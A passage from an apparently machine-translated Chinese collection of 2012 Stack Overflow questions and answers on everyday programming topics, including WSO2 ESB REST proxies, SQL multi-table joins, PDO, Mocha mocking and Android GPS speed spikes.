我希望这会给你足够的信息，看看你是否能告诉我我需要做什么来修复它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-24T09:55:16.563

更改帧的值：M_DEFAULT_MR_LETTER

旧值：高级布局 => 打印对象打开 => 所有页面

新值：高级布局 => 在上打印对象 => 第一页

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-28T06:34:47.937

打印对象在 => 第一页

你也需要垂直弹性 - >变量

# compression - tinypng.org 如何压缩 PNG 文件？

> ID：12146859
> 
> 赞同：47
> 
> 时间：2012-08-27T17:44:13.857
> 
> 标签：compression, png

[http://tinypng.org/](http://tinypng.org/)是一项很棒的服务，他们将我的 png 图像优化了约 67%。他们的服务如何运作？他们如何才能最小化图片的大小和质量仍然保持不变？

* * *

## 回答 #1

> 赞同：74
> 
> 时间：2012-08-27T17:48:00.130

答案就在那个网页上：

> 当您上传 PNG（便携式网络图形）文件时，图像中相似的颜色会组合在一起。这种技术被称为“量化”。由于颜色数量减少，24 位 PNG 文件可以转换为更小的 8 位索引彩色图像。所有不必要的元数据也被剥离。结果：100% 支持透明度的微小 8 位 PNG 文件。有你的蛋糕，也吃吧！

它将 24 位 RGB 文件转换为调色板化的 8 位文件。你会失去一些颜色深度，但对于小图像，它通常是难以察觉的。

您可以使用这个很棒的工具在命令行上手动执行相同的操作：http: [//pngquant.org/](http://pngquant.org/)

# windows-phone-7 - 如何在 Windows Phone 7 中使用反射停止 led 手电筒/手电筒应用程序

> ID：12146860
> 
> 赞同：0
> 
> 时间：2012-08-27T17:44:16.893
> 
> 标签：windows-phone-7, windows-phone-7.1, windows-phone-7.1.1

我正在制作一个手电筒应用程序，其中我需要在按下 ON 按钮时不断使用相机的 LED 并在按下同一个按钮时将其关闭。我按照这篇文章[使用 Reflection 使用摄像机打开 LED](http://www.locked.nl/wp7-flashlight-getting-started)。ON/OFF 操作只能正常工作一次。代码如下：

```
 private VideoCamera _videoCamera;
 private VideoCameraVisualizer _videoCameraVisualizer;
 bool _isFlashOff = true;

 private void FlashButton_Click(object sender, RoutedEventArgs e)
    {
        try
        {
            if (_isFlashOff)
            {
                _isFlashOff = false;

                // Check to see if the camera is available on the device.
                if (PhotoCamera.IsCameraTypeSupported(CameraType.Primary))
                {
                   // Use standard camera on back of device.
                    _videoCamera = new VideoCamera();
                   // Event is fired when the video camera object has been initialized.
                    _videoCamera.Initialized += VideoCamera_Initialized;

                    // Add the photo camera to the video source
                    _videoCameraVisualizer = new VideoCameraVisualizer();
                    _videoCameraVisualizer.SetSource(_videoCamera);
                }
            }
            else
            {                    
                _isFlashOff = true;
                _videoCamera.StopRecording();
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void VideoCamera_Initialized(object sender, EventArgs e)
    {
        _videoCamera.LampEnabled = true;
        _videoCamera.StartRecording();
    } 
```

由于没有按照文章中指定的 VideoCamera 类中的**StopRecording方法实现：**[使用 Reflection 使用摄像机打开 LED](http://www.locked.nl/wp7-flashlight-getting-started)。我将函数设为：

```
 public void StopRecording()
    {
        // Invoke the stop recording method on the video camera object.
         _videoCameraStopRecordingMethod.Invoke(_videoCamera, null);
    } 
```

问题是当我再次按下 ON 按钮时，“异常”被抛出为“TargetInvocationException”。我无法找出导致异常的问题。StopRecording() 函数是否正确..？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-02T10:28:19.687

那是因为您应该只初始化一次相机。在`OnNavigatedTo`活动期间执行此操作，然后重新使用相同的实例：

```
 protected override void OnNavigatedTo(System.Windows.Navigation.NavigationEventArgs e)
    {                    
        // Use standard camera on back of device.
        _videoCamera = new VideoCamera();

        // Event is fired when the video camera object has been initialized.
        _videoCamera.Initialized += VideoCamera_Initialized;

        // Add the photo camera to the video source
        _videoCameraVisualizer = new VideoCameraVisualizer();
        _videoCameraVisualizer.SetSource(_videoCamera);
    }

    private void VideoCamera_Initialized(object sender, EventArgs e)
    {
        isInitialized = true;
    }

    bool isInitialized;
    bool isFlashEnabled;

    private void Button_Click(object sender, System.Windows.RoutedEventArgs e)
    {
        if (!isInitialized)
        {
            MessageBox.Show("Please wait during camera initialization");
            return;
        }

        if (!isFlashEnabled)
        {
            isFlashEnabled = true;

            // Check to see if the camera is available on the device.
            if (PhotoCamera.IsCameraTypeSupported(CameraType.Primary))
            {
                _videoCamera.LampEnabled = true;
                _videoCamera.StartRecording();
            }
        }
        else
        {
            isFlashEnabled = false;

            _videoCamera.StopRecording();
        }
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T20:28:50.497

试试这个：

[http://msdn.microsoft.com/en-us/library/hh202949.aspx](http://msdn.microsoft.com/en-us/library/hh202949.aspx)

# java - maven中的隐式编译

> ID：12146870
> 
> 赞同：0
> 
> 时间：2012-08-27T17:45:26.323
> 
> 标签：java, maven, javac

使用 javac，可以从特定的源代码树将 java 文件隐式编译为类文件。换句话说，可以指向给定的源代码树并只编译明确提到的 java 文件所需的 java 文件。使用 maven 构建时是否可以获得相同的功能。而且，如果是这样，我将如何去做？

**编辑：**我不是在说定义一个特定的 java 源文件列表。标准的 java 编译器允许一个开关，它使编译器本身根据导入来确定依赖关系。如果在类路径中找不到导入的类，则检查源路径以查看是否存在给定类的 java 文件。如果有，则将该 java 文件添加到编译中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T17:54:26.557

您必须配置 maven 编译器以设置要包含/排除的文件：

```
<project>
    <build>
        <plugins>
            <plugin>
            <groupId>org.apache.maven.plugi ns</groupId>
            <artifactId>maven-compiler-plug in</artifactId>
            <configuration>
            <!-- put your configurations here -->
            </configuration>
            </plugin>
        </plugins>
    </build>
</project> 
```

如果您想包含/排除不同的文件集，您也可以对不同的 Maven 配置文件执行此操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:54:55.963

对于**maven-compiler-plugin**，您可以使用*包含*和*排除*集，您可以在其中指定文件名的模式以排除和包含到编译中。您还可以使用 Ant 脚本。

有关详细信息，请参阅[http://maven.apache.org/plugins/maven-compiler-plugin/compile-mojo.html](http://maven.apache.org/plugins/maven-compiler-plugin/compile-mojo.html)。

# sass - 基础框架 - 文件夹搞砸了

> ID：12146878
> 
> 赞同：1
> 
> 时间：2012-08-27T17:46:15.070
> 
> 标签：sass, zurb-foundation

全新安装框架。

当我用 ruby​​ 打开 app.scss 时： sass --watch app.scss:app.css

我收到一个错误 - “无法导入文件 abc ...”

该错误是意料之中的，因为在所有基础 scss 文件中，对不存在的文件都有“重要”的引用！

从foundation.scss 本身开始。

任何想法为什么会发生这种情况以及如何让它发挥作用？

顺便说一句，我在 Windows 上本地工作。

我做的安装顺序：ruby -> sass -> compass -> zurb-foundation

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-17T11:59:04.970

我在这里迟到了，但我认为这也会对其他人有所帮助。

[从https://github.com/zurb/foundation](https://github.com/zurb/foundation)下载 Foundation master

从foundation-master 文件夹内的scss 文件夹中获取foundation.scss 文件。

将其重命名为 _foundation.scss 并将其放在项目的 sass 文件夹中， _foundation.scss 文件包含所有内容，因此我认为它将解决您的问题。

# wso2 - 将 WSO2 ESB 公开为 REST 以在 JavaScript 中使用

> ID：12146883
> 
> 赞同：1
> 
> 时间：2012-08-27T17:46:35.340
> 
> 标签：wso2, esb

几天来，我一直在 Stackoverflow 和 WSO2 ESB 文档中进行研究，但我还没有找到任何明确的答案。

我的应用程序使用 JavaScript 并使用 Dojo 框架。理想情况下，所有 Web 服务调用都应针对 REST 进行并返回 JSON。由于这个示例 440，我知道如何让 SOAP xml 作为 JSON 返回：“ **http//wso2.org/project/esb/java/4.0.3/docs/samples/advanced_mediation_samples.html#Sample440** ”我看过在此博客上发布的示例中：“ **http//vvratha.blogspot.ca/2011/11/invoking-restful-service-via-wso2esb.html** ”我似乎能够从soapUI之类的工具调用代理服务并以 JSON 格式获取我的结果。所以我只能假设 ESB 工作正常**但是当我尝试使用 dojo.xhrGet 或 dojo.io.script.get 调用它时，数据总是返回为 NULL！**

我应该为 ESB 代理服务调用 REST 中的什么方法？如果我查看服务的 wsdl，该操作似乎称为“调解”，但这并没有让我更进一步。我查看了示例 800：“ **http//wso2.org/project/esb/java/4.0.3/docs/samples/rest_api_samples.html#Sample800** ”但我不清楚在哪里使用它。

注意：对于那些 http 链接，请在 http 之后添加“：”。我似乎用完了超链接的配额。

Ratha 帮助后的更多信息： 1\. 这就是我想调用代理服务的方式：（稍后会有更多查询字符串参数）http//loh7:8280/services/TestRestProxy?address=1460%20nicholson%20road

1.  此中介消息跟踪器转储中的查询字符串为空：

    13:10:10,803 [-] [HttpServerWorker-16] INFO 代理服务 TestRestProxy 从：192.168.7.143
    13:10:10,803 [-] [HttpServerWorker-16] INFO 消息接收到新消息：/services/TestRestProxy?address= 1460%20nicholson%20road
    13:10:10,803 [-] [HttpServerWorker-16] 信息 SOAPAction: null
    13:10:10,803 [-] [HttpServerWorker-16] 信息 WSA-Action: null
    13:10:10,803 [-] [ HttpServerWorker-16] INFO 使用代理服务的匿名序列进行中介
    13:10:10,804 [-] [HttpServerWorker-16] INFO Start : Sequence
    13:10:10,804 [-] [HttpServerWorker-16] INFO Sequence : : mediate()
    13:10:10,804 [-] [HttpServerWorker-16] INFO Start : 日志调解器
    13:10:10,805 [-] [HttpServerWorker-16] INFO querystring = null
    13:10:10,805 [-] [HttpServerWorker-16] INFO 结束：日志中介
    13:10:10,806 [-] [HttpServerWorker-16] INFO 开始：日志中介
    13:10:10,806 [-] [HttpServerWorker-16] INFO结束：日志中介
    13:10:10,806 [-] [HttpServerWorker-16] INFO 开始：发送中介
    13:10:10,806 [-] [HttpServerWorker-16] INFO 通过端点发送消息：EsriNA10 解析到地址 =

这是代理的样子： 注意：我想提取“地址”值并将其放在请求肥皂消息中的 $1 中。

```
<proxy xmlns="http://ws.apache.org/ns/synapse" name="TestRestProxy" transports="https,http" statistics="disable" trace="enable" startOnLoad="true">
   <target>
      <inSequence>
         <log level="custom">
            <property name="querystring" expression="get-property('REST_URL_POSTFIX')" />
         </log>
         <payloadFactory>
            <format>
               <GeocodeAddress xmlns="http://www.esri.com/schemas/ArcGIS/10.0" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                  <Address xmlns="">
                     <PropertyArray>
                        <PropertySetProperty>
                           <Key>Street</Key>
                           <Value>$1</Value>
                        </PropertySetProperty>
                        <PropertySetProperty>
                           <Key>City</Key>
                           <Value>Newmarket</Value>
                        </PropertySetProperty>
                        <PropertySetProperty>
                           <Key>State</Key>
                           <Value>ON</Value>
                        </PropertySetProperty>
                        <PropertySetProperty>
                           <Key>Zip</Key>
                           <Value>L3Y 9C3</Value>
                        </PropertySetProperty>
                        <PropertySetProperty>
                           <Key>Country</Key>
                           <Value>CANADA</Value>
                        </PropertySetProperty>
                     </PropertyArray>
                  </Address>
                  <PropMods xmlns="">
                     <PropertyArray>
                        <PropertySetProperty>
                           <Key>OutputSpatialReference</Key>
                           <Value xmlns:q2="http://www.esri.com/schemas/ArcGIS/10.0" xsi:type="q2:ProjectedCoordinateSystem">
                              <WKID>102100</WKID>
                           </Value>
                        </PropertySetProperty>
                     </PropertyArray>
                  </PropMods>
               </GeocodeAddress>
            </format>
            <args>
               <arg expression="$ctx:querystring" />
            </args>
         </payloadFactory>
         <log level="full" category="TRACE" separator="," />
         <send>
            <endpoint key="EsriNA10" />
         </send>
      </inSequence>
      <outSequence>
         <log level="full" separator="," />
         <xslt key="out_transform" />
         <property name="messageType" value="application/json" scope="axis2" type="STRING" />
         <send />
      </outSequence>
   </target>
</proxy> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-28T10:13:08.380

在示例 800 中，它解释了如何直接调用 RESTAPI。例如，如果您的 REST 服务端点指向您的服务端点。注意以下配置；

```
<api name="StockQuoteAPI" context="/stockquote">
   <resource uri-template="/view/{symbol}" methods="GET"> 
```

我们在哪里定义 RESTAPI 调用 stockquoteAPI 并定义上下文和 uritemplate.. 因此，当您尝试执行上述 API 时，使用 curl 或其他 REST 客户端并执行类似；

```
curl -v http://127.0.0.1:8280/stockquote/view/IBM 
```

在这里，您将看到我们提供了上下文和 uri 模板..从中我们选择符号调用 IBM 并发送到 stcokquote 服务..但这是您的逻辑，您可以按顺序定义自己的逻辑。

**编辑**

从浏览器尝试这样；

```
http://localhost:8280/services/yourProxy/<Operation>?param1=21312&param2=wqeqw 
```

这里的“操作”是您尝试调用的操作（存在于您的后端 REST 服务中）。

“调解”是默认操作。如果您想执行实际的后端服务操作，请提供上述操作。

当您定义代理时，请按照我在博客中的示例..

```
<proxy name="yourProxy" transports="https http" startOnLoad="true" trace="disable">
        <target>   
            <endpoint>
              <address uri="Your REST SERVICE ENDPOINT URL"/>
            </endpoint>  
           <inSequenc>
               <log level ="custom">
                 <property name="querystrings" expression=get-property('REST_URL_POSTFIX')/>
               </log>
          </inSequnece>           
            <outSequence>
                <send/>
            </outSequence>
        </target>
    </proxy> 
```

试试上面的代理，看看它从“querystrings”记录了什么

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T18:41:59.757

您可以使用 REST API 来调用所有这些 http 动词。只需定义您喜欢执行的动词的类型..并将请求路由到服务端点这是一个简单的介绍部分..希望可以帮助您.. [http:// /vvratha.blogspot.com/2012/09/rest-support-in-wso2esb-introduction.html](http://vvratha.blogspot.com/2012/09/rest-support-in-wso2esb-introduction.html)

# javascript - 为什么“appendChild”会移动一个节点？

> ID：12146888
> 
> 赞同：3
> 
> 时间：2012-08-27T17:47:05.797
> 
> 标签：javascript, treenode

我正在玩原生 javascript。我基本上是在练习基本的节点操作，例如添加、删除、移动、复制和创建。

在测试移动时，我有一个问题。

[http://jsfiddle.net/sJg7E/](http://jsfiddle.net/sJg7E/)

如果您查看上面的 jsfiddle，我使用了“appendChild”。它如何将节点移动到新的div？我知道如果我想复制一个节点，我需要克隆一个节点。“appendChild”命令看起来/听起来不正确。

这是预期的行为吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-27T17:49:24.027

一个节点只能有一个父节点。因此，如果您将其附加到另一个节点，它会移动它。

从[appendChild 的文档中](https://developer.mozilla.org/en-US/docs/DOM/Node.appendChild)：

> 将一个节点添加到指定父节点的子节点列表的末尾。如果节点已经存在，则将其从当前父节点中删除，然后添加到新的父节点。

从同一页面：

> 您可以使用 cloneNode 来制作节点的副本，然后再将其附加到新父节点下。（请注意，使用 cloneNode 制作的副本不会自动保持同步。）

另请注意：

> 此方法不允许在不同文档之间移动节点。如果你想从不同的文档追加节点（例如显示来自 AJAX 请求的结果），你必须首先使用 importNode。

您还可以阅读[appendChild](http://www.w3.org/TR/DOM-Level-3-Core/core.html#ID-184E7107)的 w3c 规范：

> 将节点 newChild 添加到该节点的子节点列表的末尾。如果 newChild 已经在树中，则首先将其移除。

# node.js - 在 NodeJs 中使用 mocha 进行模拟

> ID：12146889
> 
> 赞同：24
> 
> 时间：2012-08-27T17:47:13.397
> 
> 标签：node.js, mocking, mocha.js

如何使用 NodeJs 在 Mocha 中模拟客户端和服务器。具体来说，我有以下代码：

```
app.post ('path name', function (req, res) { 
  // Some Action 
  res.send(response); 
}); 
```

我想模拟`req`,`res`参数和测试`res`（状态、标题、消息）。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-08-27T19:13:51.150

Mocha 本身不提供模拟/存根/间谍类型功能。[Sinon](http://sinonjs.org/)是一个受欢迎的图书馆。主页包括测试 ajax 及其 Fake XMLHTTPRequest 对象的示例。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-28T12:05:25.143

我发现[Node-Fakeweb](https://github.com/ctide/fakeweb)很有用

```
var request = require('request'); 
  // Mocking a client request 
  request.get({ uri: 'URI', body: 'body' }, function (err, resp, body) {
    // Some Action
  });
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-10-17T13:22:25.400

你可以使用 mocha 和[supertest](https://github.com/visionmedia/supertest)来模拟一个请求。这是一个关于如何做到这一点的精彩教程：http: [//thewayofcode.wordpress.com/2013/04/21/how-to-build-and-test-rest-api-with-nodejs-express-mocha/](http://thewayofcode.wordpress.com/2013/04/21/how-to-build-and-test-rest-api-with-nodejs-express-mocha/)

# php - php数组按日期stdClass对象排序

> ID：12146893
> 
> 赞同：0
> 
> 时间：2012-08-27T17:47:33.533
> 
> 标签：php, arrays, joomla, stdclass

我有一个这样的数组：

```
Array ( [0] => stdClass Object ( [id] => 41 [title] => test2 [alias] => test2 [catid] => 8 [published] => 1 [introtext] =>
test2

[fulltext] => [video] => [gallery] => [extra_fields] => [] [extra_fields_search] => [created] => 2012-08-27 16:37:51 [created_by] => 62 [created_by_alias] => [checked_out] => 0 [checked_out_time] => 0000-00-00 00:00:00 [modified] => 0000-00-00 00:00:00 [modified_by] => 0 [publish_up] => 2012-08-27 16:37:51 [publish_down] => 0000-00-00 00:00:00 [trash] => 0 [access] => 1 [ordering] => 15 [featured] => 0 [featured_ordering] => 0 [image_caption] => [image_credits] => [video_caption] => [video_credits] => [hits] => 0 [params] => JParameter Object ( [_raw:protected] => 
```

等等在那个数组中（里面有很多东西）。

现在是这样显示的

项目 | 日期
项目 | 日期
项目 | 日期

我想要做的是获取该数组并按聚合日期对其进行排序

有人这样想

聚合日期
项目 | 日期
项目 | 日期
聚合日期
项目 | 日期
项目 | 日期

考虑到这个数组，这甚至可能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T18:06:49.087

这是你想要的？

```
$newArray = array();
foreach ($myArrayOfStdClasses as $key => $obj) {
    $newArray[date('Y-m-d', strtotime($obj->created]))[] = array('title' => $obj->tile, 'date' => $obj->created);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T18:17:49.667

您可以使用 usort 来定义您的排序功能：

```
usort($items, function($item1, $item2){
   if($item1->created == $item2->created)
      return 0;

   return $item1->created < $item2->created ? -1 : 1;
}); 
```

这只会对它们进行排序。然后在循环输出时，您可以根据天、小时、月进行聚合...

# css - 文件名中的 CSS 版本？

> ID：12146900
> 
> 赞同：2
> 
> 时间：2012-08-27T17:47:55.747
> 
> 标签：css, git, web

有一个快速的问题。

假设我创建了 file `stylesheet.css`。在这个文件中：

```
body {
    background: #000000;
} 
```

现在假设我更改了背景颜色，使此文件版本为 1.0：

```
body {
    background: #FFFFFF;
} 
```

我会更改样式表的链接以包含 ?v=1.0 吗？这会迫使浏览器重新加载样式表并使用新的更改，以便不缓存旧设置吗？另外，假设前面的所有内容都是正确的，那么根据版本提交更改是否是一种好习惯？因此，就像我在样式表中进行更改并将它们配音足够严重以保证 a`v2.0`一样，然后将样式表提交为“v2.0”？谢谢！

```
<link rel="stylesheet" href="stylesheet.css?v=1.0"> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T17:51:26.410

如果 URL（包括查询字符串）不在浏览器的缓存中，则将请求一个新文件。

是的，这是强制版本控制的有效方法。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-27T17:54:27.147

这确实会强制所有浏览器完全重新加载 CSS，如下所述：

[什么是'？在 Css 链接中做什么？](https://stackoverflow.com/questions/438821/what-does-do-in-a-css-link/438828#438828)

答案说：

> 那是为了给文件名添加一些唯一性，这样当他们更改 CSS 文件时，他们可以更改额外的位以完全确保每个客户端都会重新加载 CSS 而不是使用缓存版本。
> 
> 网络服务器将忽略该参数并正常服务 /Content/all.min.css

顺便说一下，StackOverflow 使用了这种技术。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T17:51:35.170

如果您将链接更改为 ?v=1.0，那么您将覆盖服务器已设置的任何缓存机制，浏览器将看到样式表的新 url，并重新下载您的新更改，确保用户立即看到新的变化。

如果您不附加查询字符串，那么用户将根据您的 Web 应用程序上配置的缓存设置更新他们的样式表，这可能会因配置方式/您使用的框架而有很大差异。

# java - android gps尖峰问题

> ID：12146904
> 
> 赞同：0
> 
> 时间：2012-08-27T17:48:17.997
> 
> 标签：java, android, eclipse

我遇到了一个非常愚蠢的问题

```
lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 0, ll);
    float spd = myLoc.distanceTo(previousLocation) / (myLoc.getTime() - previousLocation.getTime()); 
```

以前的位置是`myLoc`存储的最后一次`onLocationChanged`被调用，即每 1 秒后调用一次。

现在我的问题是，有时它会给出非常大的峰值。比平时`spd`要高得多。

任何人都可以告诉我如何减少这个

最好的祝福

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T18:21:10.457

一些建议：

1.  检查`Location.hasSpeed()`是否为您提供了此信息。它可能比您的计算更可靠，尽管我对用于产生此值的算法一无所知。

2.  检查`Location.getAccuracy()`以决定何时忽略计算速度的特定修复。

3.  仔细阅读这些提示，以查看在处理 GPS 结果时如何选择的示例。它们可能太旧或太不精确而无法用于速度。[http://developer.android.com/guide/topics/location/strategies.html#Updates](http://developer.android.com/guide/topics/location/strategies.html#Updates)

4.  对于我工作的应用程序，我实现了一个过滤器，将当前位置与之前的两个位置进行比较，并使用最低计算速度。您可能需要一种或多或少复杂的方法来确定对您有用的速度。

# sql - 多个表的内连接

> ID：12146905
> 
> 赞同：14
> 
> 时间：2012-08-27T17:48:18.060
> 
> 标签：sql, join, foreign-keys, relational-database, 3nf

我有这四个表：

```
PRODUCTS
---------
PRODUCT_ID
PRODUCT_TITLE
(other fields)

COLORS
---------
COLOR_ID
COLOR_NAME

MATERIALS
---------
MATERIAL_ID
MATERIAL_NAME

IMAGES
---------
IMAGE_ID
BIG
MED
SMALL
THUMB

SIZE
---------
SIZE_ID
SIZE_NAME 
```

并且：

```
PRODUCT_COLOR
---------
PRODUCT_ID
COLOR_ID

PRODUCT_MATERIAL
---------
PRODUCT_ID
MATERIAL_ID

PRODUCT_SIZE
---------
PRODUCT_ID
SIZE_ID

PRODUCT_IMAGE
---------
PRODUCT_ID
IMAGE_ID
COLOR_ID (can be null)
MATERIAL_ID (can be null) 
```

所有产品都可以有不同的颜色和/或材料。例如，我可以拥有一种产品，该产品具有一种或多种材料选项，但没有关联颜色，反之亦然。输出应该是这样的：

```
-----------------------------------------------------------------------------
| PRODUCT_ID | PRODUCT_NAME  | COLOR_ID | MATERIAL_ID | IMAGE_ID | SIZE_ID |
-----------------------------------------------------------------------------
| 1          | T-SHIRT       | 1        | null        | 1        | 1        |
| 1          | T-SHIRT       | 1        | null        | 1        | 2        |
| 1          | T-SHIRT       | 1        | null        | 1        | 3        |
| 1          | T-SHIRT       | 1        | null        | 1        | 4        |
| 2          | JEANS         | null     | 1           | 2        | 1        |
| 2          | JEANS         | null     | 1           | 2        | 2        |
| 2          | JEANS         | null     | 1           | 2        | 3        |
| 2          | JEANS         | null     | 1           | 2        | 4        |
| 2          | JEANS         | null     | 1           | 2        | 5        |
| 3          | T-SHIRT VNECK | 2        | 2           | 3        | 1        |
| 3          | T-SHIRT VNECK | 2        | 2           | 3        | 2        |
| 3          | T-SHIRT VNECK | 3        | 2           | 4        | 1        |
| 3          | T-SHIRT VNECK | 3        | 2           | 4        | 2        |
| 3          | T-SHIRT VNECK | 4        | 3           | 5        | 1        |
| 3          | T-SHIRT VNECK | 4        | 3           | 5        | 2        |
----------------------------------------------------------------------------- 
```

我尝试了以下语句，但它返回 0 行：

```
SELECT PRODUCTS.PRODUCT_ID, PRODUCTS.PRODUCT_TITLE, COLORS.COLOR_ID, MATERIALS.MATERIAL_ID, IMAGES.IMAGE_ID, SIZE.SIZE_ID from PRODUCTS
    INNER JOIN PRODUCT_COLOR ON (PRODUCTS.PRODUCT_ID = PRODUCT_COLOR.PRODUCT_ID)
    INNER JOIN COLORS ON (COLORS.COLOR_ID = PRODUCT_COLOR.COLOR_ID)
    INNER JOIN PRODUCT_MATERIAL ON (PRODUCTS.PRODUCT_ID = PRODUCT_MATERIAL.PRODUCT_ID)
    INNER JOIN MATERIALS ON (MATERIALS.MATERIAL_ID = PRODUCT_MATERIAL.MATERIAL_ID)
    INNER JOIN PRODUCT_IMAGE ON (PRODUCTS.PRODUCT_ID = PRODUCT_IMAGE.PRODUCT_ID)
    INNER JOIN IMAGES ON (IMAGES.IMAGE_ID = PRODUCT_IMAGE.IMAGE_ID)
    INNER JOIN PRODUCT_SIZE ON (PRODUCTS.PRODUCT_ID = PRODUCT_SIZE.PRODUCT_ID)
    INNER JOIN SIZE ON (SIZE.SIZE_ID = PRODUCT_SIZE.SIZE_ID)
    ORDER BY PRODUCTS.id_PRODUCT; 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-08-27T17:56:01.337

你可以这样做：

```
select p.product_id,
  p.product_name,
  c.color_id,
  m.material_id,
  i.image_id,
  s.size_id
from products p
left join product_color pc
  on p.product_id = pc.product_id
left join colors c
  on pc.color_id = c.colorid
left join product_material pm
  on p.product_id = pm.product_id
left join materials m
  on pm.material_id = m.material_id
left join product_image pi
  on p.product_id = pi.product_id
left join images i
  on pi.image_id = i.image_id
  or c.color_id = i.color_id
  or m.material_id = i.material_id
left join product_size ps
  on p.product_id = ps.product_id
left join size s
  on ps.size_id = s.size_id 
```

我会建议你审查`JOIN`s。在线连接有一个很好的[可视化解释](http://www.codinghorror.com/blog/2007/10/a-visual-explanation-of-sql-joins.html)，可以帮助您编写这些查询。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-27T17:57:58.360

好吧，您需要学习如何构建连接，而我通常这样做的方式是选择一个表并连接下一个和下一个和下一个，直到我得到我想要的结果。

```
select product_id, product_name
  from products 
```

接下来我加入我需要的第一个，所以我继续说

```
select p.product_id, p.product_name, pc.color_id
  from products p
  join product_color pc on (pc.product_id = p.product_id) 
```

在加入时，重要的是要弄清楚我是否可能没有什么可加入的，我仍然想看到这条线。所以我宁愿使用左连接

```
 select p.product_id, p.product_name, pc.color_id
       from products p
  left join product_color pc on (pc.product_id = p.product_id) 
```

这样您就可以添加要加入的每个表。顺便一提。这是作业吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T18:01:10.473

如果您只需要 ID，请保持简单

```
select p.product_id,
  p.product_name,
  pc.color_id,
  pm.material_id,
  pi.image_id,
  ps.size_id
from products p, 
PRODUCT_COLOR pc, 
product_material pm, 
PRODUCT_SIZE ps, 
PRODUCT_IMAGE pi
where 
p.product_id = pc.product_id(+)
and p.product_id = pm.product_id(+)
and p.product_id = ps.product_id(+)
and p.product_id = pi.product_id(+); 
```

# ios - 链接到 JQueryMobile 文件会使 UIWebView 页面加载延迟 3-4 秒

> ID：12146906
> 
> 赞同：1
> 
> 时间：2012-08-27T17:48:21.490
> 
> 标签：ios, uiwebview

我有一个非常小的简单网页，在 UIWebView 中加载大约需要 3 或 4 秒，原因是以下文件

```
<link rel="stylesheet"  href="jquery.mobile-1.1.1.min.css" />  
<script src="jquery-1.7.2.min.js"></script>
<script src="jquery.mobile-1.1.1.min.js"></script> 
```

把这些拿出来，显然它不能正确显示，但它会立即加载。

有没有人知道任何解决方法或经历过类似的。3-4秒太长了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-02T20:35:28.920

我希望我能有所帮助，但遗憾的是我有同样的问题。

我发现奇怪的事情：这个问题只适用于当我在应用程序启动后我将显示的第一个 html 文件中加载 Jquery mobile 时。不知道为什么！

# php - PHP PDO mysql_result() 等效？

> ID：12146908
> 
> 赞同：2
> 
> 时间：2012-08-27T17:48:35.797
> 
> 标签：php, oop, object, pdo, fetch

我将在 PDO 中使用什么而不是旧的 mysql_resul()？

```
function ib_uk_isvalid($db,$uk) {
    try {

    $sth = $db->prepare("SELECT count(*) FROM ib_userkeys WHERE value=:val");
    $sth->bindParam(":val",$uk);
    $sth->execute();
    $numrows = $sth->fetchColumn();

    if($numrows>=1) {

        $sth2 = $db->prepare("SELECT * FROM ib_userkeys WHERE value=:val");
        $sth2->bindParam(":val",$uk);
        $sth2->execute();
        $res = $sth2->fetchAll();
        print($res[0]->type);

    } else {
    return 0;
    }

    } catch (PDOException $e) {

        return $e->getMessage();

    }
}

ib_uk_isvalid($db,1234) 
```

给我错误，因为它返回表而不是对象（我需要）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T17:54:03.230

```
function ib_uk_isvalid($db, $uk) {
    $query = $db->prepare('SELECT * FROM ib_userkeys WHERE value = :val LIMIT 1');
    $query->bindValue(':val', $uk);
    $query->execute();

    $row = $query->fetch(PDO::FETCH_OBJ);

    return $row ? $row->type : 0;
} 
```

……我是这么写的。它可能会解决问题。

# asp.net-mvc - 让图形设计师在 ASP.NET MVC 中编辑视图

> ID：12146909
> 
> 赞同：0
> 
> 时间：2012-08-27T17:48:36.847
> 
> 标签：asp.net-mvc, visual-studio

我们有图形/界面设计师正在为我们的网站开发 html/css。我怎样才能让他在不让他访问控制器和模型的情况下处理 cshtml 和 css 文件？问候

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:52:21.507

为什么不将控制器和模型分成单独的类库项目，由 MVC 项目引用？这样，您可以公开 MVC 项目，包括视图、样式和脚本，但保持基础设施私有。

只要您保持命名约定正确，您就不应该对控制器分开有任何问题。

# arrays - 查找给定数组排列的（字典）索引。

> ID：12146910
> 
> 赞同：11
> 
> 时间：2012-08-27T17:48:48.290
> 
> 标签：arrays, algorithm, permutation

给定一个数组说“bca”，我需要找到字典序上大于给定排列的排列数。

因此，在本例中，cab、cba 是更大的排列。因此答案是 2。

我尝试通过查找数组的字典排序来解决这个问题，但我无法为这个说法设计一个有效的算法。

任何朝着正确方向的帮助/指针表示赞赏！

* * *

## 回答 #1

> 赞同：17
> 
